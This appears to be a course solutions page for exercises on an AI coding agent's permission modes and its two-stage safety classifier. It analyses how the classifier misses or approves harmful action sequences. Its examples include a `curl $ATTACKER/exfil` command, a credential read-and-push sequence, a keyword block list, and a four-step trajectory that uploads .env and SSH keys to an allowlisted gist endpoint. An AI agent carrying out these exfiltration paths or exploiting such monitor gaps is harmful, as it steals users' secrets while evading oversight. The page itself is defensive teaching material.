<!-- generated:start -->
# 15-autonomous-systems / 10-claude-code-permission-modes

Solutions to all 5 exercises. Source: [lesson page](https://yennj12.js.org/ai-engineering-from-scratch/phases/15-autonomous-systems/10-claude-code-permission-modes/) · upstream spec
`phases/15-autonomous-systems/10-claude-code-permission-modes/docs/en.md`

```bash
uv run demo practice run 10-claude-code-permission-modes --ex 1
uv run demo explain 10-claude-code-permission-modes --ex 1
uv run pytest demos/phases/15-autonomous-systems/10-claude-code-permission-modes
```

Solutions import the lesson's own `code/` rather than copying it, so every check
compares against the reference implementation and not a fork of it (`DESIGN D5`).

| # | Exercise | Kind | Tier | Ships |
|---|---|---|---|---|
| 1 | Run `code/main.py`. Which synthetic action type is never flagged by Stage 1 but always caught… | code | T0 | `ex01_stage_two_is_unreachable_without_stage_one.py` |
| 2 | Extend the Stage 1 rule set to catch a specific known-bad shape (e.g., `curl $ATTACKER/exfil`… | code | T0 | `ex02_the_extension_cannot_raise_the_false_positive_rate.py` |
| 3 | Read Anthropic's "How the agent loop works" doc. List every external state the agent touches… | explain | T0 | prose, below |
| 4 | Design a 24-hour unattended run budget: `max_turns`, `max_budget_usd`, per-tool caps, allowli… | code | T0 | `ex04_the_budget_that_binds_is_the_escalation_rate.py` |
| 5 | Describe one trajectory where every individual action is approved by the classifier, yet the… | code | T0 | `ex05_the_allowlist_is_three_publishing_endpoints.py` |
<!-- generated:end -->

## Answers

### 1 — Stage 2 is unreachable without Stage 1

**Which action type is never flagged by Stage 1 but always caught by Stage 2?
None — and not for this trajectory, for any trajectory.** `classify` calls
`stage2` only inside the branch where `stage1` returned True, so the set the
question describes is empty by construction. The question presumes an edge the
architecture does not have.

**Which is caught by neither?** The credential composite, actions 13–15: read
`~/.aws/credentials`, write it to `/tmp/secrets.txt`, `git add && git push`.
All three take the fast path.

| | count |
|---|---:|
| approved on the Stage 1 fast path | 10 |
| flagged by Stage 1 | 5 |
| …cleared by Stage 2 | 1 |
| …blocked by Stage 2 | 4 |
| …escalated to HITL | **0** |

**The shipped run never reaches a human.** The HITL path exists and the
demonstration does not exercise it — which matters, because in an unattended
`auto` run HITL is the branch with no one on the other end.

**Nine of the twelve Stage 1 keywords can only escalate.** Stage 2 has rules
for `rm -rf`, `sudo`, `chmod 777` and two shapes of `curl `. The other nine —
`; dd `, `chown `, `iptables`, `kubectl delete`, `drop table`, `exec('`,
`base64 -d`, `aws s3 rb`, and a bare `curl ` — fall through to the default
verdict, which is HITL. So three quarters of the keyword list stops an
unattended run rather than deciding it.

**And the only thing Stage 2 adds is subtraction.** Its repetition rule is the
same test as Stage 1's, so it detects nothing Stage 1 did not already suspect;
the one verdict it can reach that Stage 1 could not is `APPROVE`, on the host
allowlist. Stage 2 is a false-positive filter with block rules attached — which
is a useful component, and a different thing from a second detector.

### 2 — the extension cannot raise the false-positive rate

The lesson ships no benign sample, so this solution writes one: 20 ordinary
development actions, each labelled benign by hand — reads, edits, test runs,
`git status`, three legitimate `curl`s and two uses of an environment variable.

The extension: a rule matching `curl` followed by a `$`-interpolated host. It
catches `curl $ATTACKER/exfil`.

**Its marginal false-positive rate is 0.0%.** The shape matches exactly one
benign action — `curl -sSf $CI_ARTIFACT_URL -o build.tgz` — and that action
already contains `curl `, which is already a Stage 1 keyword. The rule adds 0
flags and changes 0 verdicts, on the benign sample and on the shipped
trajectory. The measurement the exercise asks for is zero by construction, and
that is the finding: any new Stage 1 rule for a `curl` shape is dominated by
the `curl ` keyword already there.

**What Stage 1 already costs on benign work:**

| | count | rate |
|---|---:|---:|
| flagged by Stage 1 | 5 / 20 | 25% |
| cleared by Stage 2 (allowlist) | 2 | 10% |
| escalated to HITL | 3 | **15%** |

15% of ordinary development actions reach a human. In an unattended run that is
15% of actions stopping it.

**The rule only bites if it is moved to Stage 2.** Written there as a block, it
converts that one benign env-var `curl` from an escalation into a hard block —
a 5% false-positive rate on exactly the shape a CI artifact download takes.
That is the real trade the exercise is asking about, and it is invisible if you
add the rule where the exercise says to add it.

**And the flagged set is two shapes, not twelve.** Only `curl ` and `chown `
ever fire on twenty actions of ordinary work. A keyword list's false-positive
rate is dominated by its most common token — and here that token is the one
Stage 2 has an allowlist for, which is not a coincidence.

### 3 — external state in `default` mode

*Draws on "The six permission modes".*

In `default` mode — the one the UI labels "Manual" — the agent touches four
kinds of external state without being told to stop: **the filesystem** (reads
anywhere the process can reach, and writes, which `acceptEdits` exists to
auto-approve because `default` prompts for them); **process execution**, since
shell commands are prompted rather than forbidden, and a single approved
command can start anything the user's shell can; **the network**, both the
model API itself and any fetch the agent makes; and **whatever the approved
commands reach transitively** — the git remote, the package index, a database
the repo's own scripts connect to, a cloud API whose credentials sit in the
environment. The mode's guarantee is that a human sees each risky action once,
not that the action's effects are bounded.

Before running `auto` unattended, the ones that need gating separately are the
three where a single approval is unbounded. **Process execution** needs an
allowlist of command shapes rather than a per-call prompt, because "approve
this shell command" in an interactive session is a judgement no classifier
reproduces. **Network egress** needs a destination policy with a verb, not a
host list — exercise 5 shows why: every host on the shipped allowlist accepts
uploads. And **credentials reachable from the environment** need to be absent
rather than gated, because no classifier keyed on command shapes can flag the
read that matters: neither `.env` nor `~/.ssh/id_ed25519` carries any of the
twelve keywords. Filesystem reads inside the workspace are the one category
that is safe to leave ungated, and only because the workspace is constrained —
which is the mode's stated precondition, not a property of the classifier.

### 4 — the budget that binds is the escalation rate

**The first cap that binds is not in the list.** On the twenty-action benign
sample, 3 actions escalate to HITL, so an unattended run meets a human-shaped
stop after **6.7 actions** in expectation. `max_turns` of any size is
irrelevant until the policy says what HITL means with nobody there. So the
budget opens with that decision — escalations deny, and the denial is logged as
a run-level counter with its own cap — and only then sets numbers:

| knob | value | where it comes from |
|---|---:|---|
| `max_turns` | 223 | largest n with `0.999^n ≥ 0.80` |
| `max_budget_usd` | 44.60 | 223 turns × $0.20, the one assumed number |
| `shell` cap | 45 | 20% of `max_turns`; shell carries the whole flag surface |
| `read`/`run`/`write` | uncapped | 9 of 20 benign actions, 0 flags between them |
| egress allowlist | 3 `(host, GET)` pairs | the shipped hosts, with a verb added |
| HITL denials | 5 | a run that hits six is not one a classifier should finish |

**`max_turns` comes from compounding, not from the clock.** At 0.999 per-step
reliability, 223 turns is where end-to-end success crosses 0.80; at 0.99 the
same bar allows 22. A 24-hour window is a duration, and how many actions fit
inside it is a reliability question — which is why the honest version of this
budget measures your own per-step rate first and derives `max_turns` from it,
rather than picking a round number and hoping.

**The dollar figure is the one number nothing here can derive.** $0.20 a turn
is an assumption; the sensitivity is linear and total, so at $0.05 the same 223
turns costs $11.15 and at $1.00 it costs $223. That is why the budget is
written as turns-first: the turn cap is derived and the dollar cap is a
restatement of it, not an independent constraint.

**The per-tool cap follows the keyword list.** All twelve Stage 1 keywords are
shell command shapes, and on the benign sample only `edit` and `shell` payloads
ever carry one. Capping shell bounds the flag surface without touching the 9 of
20 actions that are reads, writes and test runs.

**And the allowlist needs a verb the rule has nowhere to put.** All three
allowlisted hosts accept uploads, and Stage 2 clears them on membership alone.
An `Action` carries a tool and a payload string and zero structured fields, so
`(host, method)` cannot be expressed against this classifier at all — the
budget names it anyway, because the gap belongs in the budget document even
when the enforcement point does not exist yet.

### 5 — the allowlist is three publishing endpoints

The lesson already ships a composite the classifier misses. This is a sharper
one: a trajectory the classifier **reviews and approves**.

| # | action | outcome |
|---|---|---|
| 1 | `read .env` | approved, Stage 1 fast path |
| 2 | `read ~/.ssh/id_ed25519` | approved, Stage 1 fast path |
| 3 | `write /tmp/notes.md` with both files concatenated | approved, Stage 1 fast path |
| 4 | `curl -X POST https://github.com/api/gists -d @/tmp/notes.md` | flagged, then **approved**: "curl to allowlisted host" |

Four actions, four approvals, zero blocks, zero escalations — and the one that
exfiltrates is on the record as reviewed.

**Every host on the allowlist accepts uploads.** `registry.npmjs.org` takes
`npm publish`, `pypi.org` takes `twine upload`, `github.com` takes gists and
pushes. A host allowlist assumes the host is a *source*; all three of these are
sinks. And the rule that clears them tests membership only — not the method,
not the body, not the direction.

**`history` is passed to both stages and consulted for one rule.** Both
`stage1` and `stage2` receive the trajectory so far, and both use it solely to
detect five identical calls in a row. Nothing in either stage relates one
action to a *different* earlier action — which is exactly what a composite is.
So the composition failure is not a missing rule; it is that no rule in this
design is allowed to have a signature that spans two different actions.

**And the read that matters is invisible to both stages.** Neither `.env` nor
`~/.ssh/id_ed25519` carries any of the twelve keywords, so Stage 2 is never
reached for either. A classifier keyed on command shapes cannot flag a read,
and the read is the action a credential exfiltration turns on. The kill
switches and canary tokens of Lesson 14 address this precisely because they do
not sit at the action boundary: a canary in `.env` fires when the *value*
leaves, whichever approved action carried it.
